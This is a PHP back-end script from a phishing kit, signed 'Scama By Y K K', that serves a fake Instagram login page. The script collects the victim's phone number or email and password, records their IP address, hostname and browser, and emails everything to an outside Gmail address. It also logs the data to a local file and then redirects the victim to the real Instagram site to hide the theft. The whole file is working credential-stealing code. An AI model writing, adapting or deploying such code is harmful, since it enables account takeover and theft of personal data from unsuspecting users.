<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$YKK .= "|----------|Scama By Y K K|--------------|\n";
$YKK .= "-------------------- Compte Instagram -------------------\n";
$YKK .= "--------------  Infos -------------\n";
$YKK .= "Numéro de téléphone       : ".$_POST['Email']."\n";
$YKK .= "Mot de passe                    : ".$_POST['Passe']."\n";
$YKK .= "|---------------|Info|-------------------|\n";
$YKK .= "IP      : $ip\n";
$YKK .= "HOST    : ".gethostbyaddr($ip)."\n";
$YKK .= "BROWSER : ".$_SERVER['HTTP_USER_AGENT']."\n";
$YKK .= "|----------|Scama By Y K K|--------------|\n";
$send = "washeligrec@gmail.com";
$subject = "~ New V Instagram By Y K K ~ | $ip";
{
mail("$send", "$subject", $YKK);     
}

$file = fopen("./YKKOriginal.txt", 'a');
fwrite($file, $YKK);

header("Location: https://www.instagram.com/?hl=fr");
?>